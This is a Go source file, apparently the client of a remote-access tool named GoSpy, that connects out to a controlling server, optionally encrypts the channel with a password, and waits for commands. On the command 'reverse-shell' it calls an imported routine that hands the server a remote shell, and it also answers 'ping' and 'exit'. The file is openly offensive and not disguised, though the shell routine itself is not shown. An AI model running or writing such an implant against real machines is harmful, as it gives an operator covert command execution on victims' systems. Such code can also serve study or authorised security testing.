package main

import (
	"flag"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/gospy/shell"
	"log"
	"net"
	"os"
)

// ToDo: What happens if server drops?

func main() {
	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
	password := flag.String("p", "", "the password to encrypt network data with")
	flag.Parse()

	log.Printf("Using address %s\n", *address)

	conn, err := net.Dial("tcp", *address)
	if err != nil {
		log.Fatal(err)
	}

	var cm comms.PacketManager

	if *password != "" {
		cm = comms.NewEncryptedConn(conn, *password)
	} else {
		cm = comms.NewPlainConn(conn)
	}

	for {
		messageBytes, err := cm.RecvBytes()
		if err != nil {
			log.Fatal(err)
		}

		message := string(messageBytes)
		log.Printf("Recv: %s", string(message))

		switch message {

		case "exit":
			log.Println("Exiting")
			os.Exit(0)

		case "ping":
			err = cm.SendBytes([]byte("pong"))
			if err != nil {
				log.Printf("pong failed: %s\n", err.Error())
			}

		case "reverse-shell":
			err = shell.StartReverseShell(cm)
			if err != nil {
				log.Printf("reverse-shell failed: %s\n", err.Error())
			}

		}
	}
}
